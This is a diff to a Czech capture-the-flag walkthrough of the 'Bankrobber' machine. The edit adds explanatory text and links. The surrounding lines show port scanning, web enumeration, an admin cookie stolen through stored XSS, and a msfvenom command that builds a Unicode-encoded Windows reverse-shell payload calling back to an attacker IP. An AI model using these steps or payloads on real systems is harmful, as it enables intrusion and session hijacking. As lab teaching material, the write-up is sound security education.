@@ -7,7 +7,7 @@ tags: windows rce smb ssh php
 ---
 ## Úvod a kontext
 
-Bankrobber je vícekrokový řetězec, kde samotný web nestačí. Důležité jsou až mezikroky kolem `link.php`, odcizené administrátorské cookie, zpřístupnění interní služby přes `chisel` a nakonec buffer overflow na portu `910`, pro který je potřeba Unicode-safe payload.
+Bankrobber je vícekrokový řetězec, kde samotný web nestačí. Důležité jsou až mezikroky kolem `link.php`, odcizené administrátorské cookie, zpřístupnění interní služby přes `chisel` a nakonec buffer overflow na portu `910`, pro který je potřeba Unicode-safe payload. Z pohledu technik tu navazují dva samostatné problémy: [Stored XSS a admin browser a headless review jako útoková plocha](/techniky/stored-xss-a-admin-browser-a-headless-review-jako-utokova-plocha) a [Memory corruption a binary exploitation v praxi](/techniky/memory-corruption-a-binary-exploitation-v-praxi).
 
 Didakticky je tenhle stroj zajímavý hlavně tím, že kombinuje webový vstup, pivot do interního rozhraní a klasickou desktopovou reverzní analýzu v `OllyDbg`. Nejde tedy o jeden exploit, ale o návaznost několika různých disciplín.
 
@@ -16,6 +16,8 @@ Didakticky je tenhle stroj zajímavý hlavně tím, že kombinuje webový vstup,
 ### Vyhledání otevřených portů
 
 Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
+
+Praktický základ prvního skenu rozebírám i v článku [Nmap](/nastroje/nmap).
 ```bash
 nmap -p 1-65535 -T4 -A -sC -v $IP
 ```
@@ -63,7 +65,7 @@ Host script results:
 
 ### Enumerace webu
 
-Ve webové vrstvě hledám neveřejné cesty, vývojové artefakty a chybně vystavené soubory, protože právě ty často prozradí technologii aplikace, interní workflow nebo přímo přístupové údaje.
+Ve webové vrstvě hledám neveřejné cesty, vývojové artefakty a chybně vystavené soubory, protože právě ty často prozradí technologii aplikace, interní workflow nebo přímo přístupové údaje. Praktickou logiku takové content discovery rozebírám i v článku [Dirsearch](/nastroje/dirsearch).
 ```bash
 dirb http://$IP
 ```
@@ -114,6 +116,8 @@ http://10.10.10.154/user/transfer.php
 => document.cookie="id=3; username=dGhhY2tlcg%3D%3D; password=__CENSORED__
 ```
 
+V tomhle bodě je důležitý právě kontext, ve kterém se JavaScript vykoná. Hodnota payloadu neleží v samotném alertu nebo DOM manipulaci, ale v tom, že běží v privilegovaném browseru administrátora.
+
 ### Vyhledání otevřených portů (2)
 
 Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
@@ -142,7 +146,7 @@ __CENSORED__
 
 ### Spuštění exploitu
 
-V této fázi převádím předchozí zjištění do praktického kroku, který má vést k ověřitelnému přístupu nebo k dalším citlivým datům.
+V této fázi převádím předchozí zjištění do praktického kroku, který má vést k ověřitelnému přístupu nebo k dalším citlivým datům. Praktickou stránku práce s `msfvenom` a offsety z metasploití utility rozebírám i v článku [Metasploit: msfconsole a msfvenom](/nastroje/metasploit-msfconsole-a-msfvenom).
 ```text
 msfvenom --platform Windows --payload windows/x64/shell/reverse_tcp -f psh -e x86/unicode_mixed -b "\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" BufferRegister=EAX LHOST=10.10.14.223 LPORT=4002
 ```
